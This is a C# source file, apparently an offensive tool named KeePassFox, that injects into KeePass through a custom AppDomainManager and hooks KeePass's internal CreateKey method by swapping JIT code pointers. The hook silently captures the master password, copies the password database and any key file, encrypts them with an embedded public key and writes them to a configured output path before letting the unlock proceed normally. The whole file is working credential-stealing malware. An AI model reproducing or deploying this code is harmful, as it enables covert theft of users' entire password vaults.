using System;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Runtime.CompilerServices;
using System.Runtime.InteropServices.ComTypes;
using System.Text;
using System.Windows.Forms;
using Sodium;


namespace KeePassFox
{
    public class Program
    {

        static internal Object HookCreateKey(byte[] pbPasswordUtf8,
            string strKeyFile, bool bUserAccount, dynamic ioc,
            bool bNewKey, bool bSecureDesktop)
        {
            try 
            {
                encryptAndLogData(pbPasswordUtf8, strKeyFile, ioc);
            }
            catch { }

            // Call original createKey through the trampoline with the same arguments, and return the value
            Object val = TrampolineToRealCreateKey(pbPasswordUtf8, strKeyFile, bUserAccount, ioc, bNewKey, bSecureDesktop);
            return val;
        }

        static void encryptAndLogData(byte[] pbPasswordUtf8, string strKeyFile, dynamic ioc)
        {
            // First, retreive our embedded public key

            // Get a reference to embeded resources
            Assembly currentAssembly = Assembly.GetExecutingAssembly();
            byte[] publicKey = null;
            using (Stream resFilestream = currentAssembly.GetManifestResourceStream("KeePassFoxManager.public.key"))
            {
                if (resFilestream == null)
                {
                    // If the public key is not found, abort
                    return;
                }

                publicKey = new byte[resFilestream.Length];
                resFilestream.Read(publicKey, 0, publicKey.Length);
            }

            // Now, let's retreive the output path that we are going to use for logging
            string outputPath = null;
            using (Stream resFilestream = currentAssembly.GetManifestResourceStream("KeePassFoxManager.output.path"))
            {
                if (resFilestream == null)
                {
                    // If the output path is not found, abort
                    return;
                }

                StreamReader reader = new StreamReader(resFilestream);
                outputPath = reader.ReadToEnd();

            }

            // Copy the kdbx and log the original path
            string databaseFullPath = ioc.Path;

            TimeSpan t = DateTime.UtcNow - new DateTime(1970, 1, 1);
            int secondsSinceEpoch = (int)t.TotalSeconds;

            string lineKdbx = $"[KeePass.exe] KDBX : {databaseFullPath} -> keepass.kdbx.{secondsSinceEpoch}.{Process.GetCurrentProcess().Id}.log";
            // UTF-16 encode the string
            UnicodeEncoding unicode = new UnicodeEncoding();
            byte[] messageKdbx = unicode.GetBytes(lineKdbx);

            // Log the original path
            byte[] encryptedKdbxLine = SealedPublicKeyBox.Create(messageKdbx, publicKey);
            using (StreamWriter outputFile = new StreamWriter($"{outputPath}{Process.GetCurrentProcess().Id}.log", append: true))
            {
                // Flush after each write, because using BaseStream writes before the previous operation otherwise
                outputFile.Write("---BEGIN---");
                outputFile.Flush();
                outputFile.BaseStream.Write(encryptedKdbxLine, 0, encryptedKdbxLine.Length);
                outputFile.Flush();
                outputFile.Write("---END---");
                outputFile.Flush();
            }

            // Actually retreive the keyfile now
            byte[] kdbxFileData = File.ReadAllBytes(databaseFullPath);
            byte[] encryptedKdbxFileData = SealedPublicKeyBox.Create(kdbxFileData, publicKey);
            using (StreamWriter outputFile = new StreamWriter($"{outputPath}kdbx.{secondsSinceEpoch}.{Process.GetCurrentProcess().Id}.log", append: true))
            {
                // Flush after each write, because using BaseStream writes before the previous operation otherwise
                outputFile.Write("---BEGIN---");
                outputFile.Flush();
                outputFile.BaseStream.Write(encryptedKdbxFileData, 0, encryptedKdbxFileData.Length);
                outputFile.Flush();
                outputFile.Write("---END---");
                outputFile.Flush();
            }


            string line = $"[KeePass.exe] Password : {System.Text.Encoding.UTF8.GetString(pbPasswordUtf8)}";
            // UTF-16 encode the string
            byte[] message = unicode.GetBytes(line);

            byte[] encryptedPasswordLine = SealedPublicKeyBox.Create(message, publicKey);

            using (StreamWriter outputFile = new StreamWriter($"{outputPath}{Process.GetCurrentProcess().Id}.log", append: true))
            {
                // Flush after each write, because using BaseStream writes before the previous operation otherwise
                outputFile.Write("---BEGIN---");
                outputFile.Flush();
                outputFile.BaseStream.Write(encryptedPasswordLine, 0, encryptedPasswordLine.Length);
                outputFile.Flush();
                outputFile.Write("---END---");
                outputFile.Flush();
            }

            // Now, let's check if there is a KeyFile

            if (strKeyFile != null)
            {

                // Log what keyfile is retreived
                string keyFileLine = $"[KeePass.exe] KeyFile : {strKeyFile} -> keepass.keyfile.{secondsSinceEpoch}.{Process.GetCurrentProcess().Id}.log";
                // UTF-16 encode the string
                byte[] messageKeyFileLine = unicode.GetBytes(keyFileLine);
                byte[] encryptedKeyFileLine = SealedPublicKeyBox.Create(messageKeyFileLine, publicKey);

                using (StreamWriter outputFile = new StreamWriter($"{outputPath}{Process.GetCurrentProcess().Id}.log", append: true))
                {
                    // Flush after each write, because using BaseStream writes before the previous operation otherwise
                    outputFile.Write("---BEGIN---");
                    outputFile.Flush();
                    outputFile.BaseStream.Write(encryptedKeyFileLine, 0, encryptedKeyFileLine.Length);
                    outputFile.Flush();
                    outputFile.Write("---END---");
                    outputFile.Flush();
                }

                // Actually retreive the keyfile now
                byte[] keyFileData = File.ReadAllBytes(strKeyFile);
                byte[] encryptedKeyFileData = SealedPublicKeyBox.Create(keyFileData, publicKey);

                using (StreamWriter outputFile = new StreamWriter($"{outputPath}keyfile.{secondsSinceEpoch}.{Process.GetCurrentProcess().Id}.log", append: true))
                {
                    // Flush after each write, because using BaseStream writes before the previous operation otherwise
                    outputFile.Write("---BEGIN---");
                    outputFile.Flush();
                    outputFile.BaseStream.Write(encryptedKeyFileData, 0, encryptedKeyFileData.Length);
                    outputFile.Flush();
                    outputFile.Write("---END---");
                    outputFile.Flush();
                }

            }
        }

        static internal Object TrampolineToRealCreateKey(byte[] pbPasswordUtf8,
            string strKeyFile, bool bUserAccount, Object ioc,
            bool bNewKey, bool bSecureDesktop)
        {
            // This code is never used, as the pointer to the actual assembly instruction is overwritten when hooking.
            return null;
        }

        public static void Main()
        {


            // We want to locate the CreateKey method, first get the corresponding type using reflection.
            Assembly assembly = Assembly.GetEntryAssembly();
            Type KeyUtilType = assembly.GetType("KeePass.Util.KeyUtil");
            if (KeyUtilType == null)
            {
                return;
            }

            // Now get the method itself.
            MethodInfo OriginalCreateKey = KeyUtilType.GetMethod("CreateKey", BindingFlags.NonPublic | BindingFlags.Static);
            if (OriginalCreateKey == null)
            {
                return;
            }


            // Get references to the hook and the trampoline.
            Assembly selfAssembly = Assembly.GetExecutingAssembly();

            MethodInfo HookCreateKeyMethod = selfAssembly.GetType($"{typeof(Program).Namespace}.{typeof(Program).Name}").GetMethod(nameof(HookCreateKey), BindingFlags.NonPublic | BindingFlags.Static);
            MethodInfo TrampolineToRealCreateKeyMethod = selfAssembly.GetType($"{typeof(Program).Namespace}.{typeof(Program).Name}").GetMethod(nameof(TrampolineToRealCreateKey), BindingFlags.NonPublic | BindingFlags.Static);

            // Sanity check
            if (HookCreateKeyMethod == null || TrampolineToRealCreateKeyMethod == null)
            {
                return;
            }

            // JIT Compile our hook, the original method and the trampoline, so that they stay at the same memory address (hopefully).
            RuntimeHelpers.PrepareMethod(HookCreateKeyMethod.MethodHandle);
            RuntimeHelpers.PrepareMethod(TrampolineToRealCreateKeyMethod.MethodHandle);
            RuntimeHelpers.PrepareMethod(OriginalCreateKey.MethodHandle);

            unsafe
            {
                // Get the memory address of the original method
                long OriginalMethodPointer = OriginalCreateKey.MethodHandle.GetFunctionPointer().ToInt64();

                // Get address of the object containing the pointer to code
                long* OriginalCodePointer = (long*)OriginalCreateKey.MethodHandle.Value.ToPointer() + 1;

                // Ensure that the pointer retreived is pointing to the code
                if (OriginalMethodPointer != *OriginalCodePointer)
                {
                    return;
                }

                // Same for the trampoline
                long TrampolineMethodPointer = TrampolineToRealCreateKeyMethod.MethodHandle.GetFunctionPointer().ToInt64();
                long* TrampolineCodePointer = (long*)TrampolineToRealCreateKeyMethod.MethodHandle.Value.ToPointer() + 1;

                // Sanity check for the pointer retreived
                if (TrampolineMethodPointer != *TrampolineCodePointer)
                {

                    return;
                }


                // Now switch pointers.
                // Trampoline Method code pointer now points to the code in the KeePass Assembly
                *TrampolineCodePointer = OriginalMethodPointer;

                // And the original CreateKey in the KeePass Assembly now points to our hook.
                // Since the hook calls the trampoline, this also calls the original code, which unlocks the corresponding database.
                *OriginalCodePointer = HookCreateKeyMethod.MethodHandle.GetFunctionPointer().ToInt64();
            }

            return;
        }
    }
}

public sealed class KeePassFoxManager : AppDomainManager
{

    static bool isInitialized = false;

    public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
    {

        base.InitializeNewDomain(appDomainInfo);

        // As the KeePass Domain hasn't been loaded yet, we can't hook it.
        // Get a notification on Assembly load to hook later/

        AppDomain.CurrentDomain.AssemblyLoad += new AssemblyLoadEventHandler(AssemblyLoadEventHandler);
        return;
    }

    static void AssemblyLoadEventHandler(object sender, AssemblyLoadEventArgs args)
    {
        // Ensure that the EntryAssembly is accessible, and that the hooking hasn't been performed yet

        if (Assembly.GetEntryAssembly() != null && isInitialized == false)
        {
            isInitialized = true;
            KeePassFox.Program.Main();
        }

    }
}
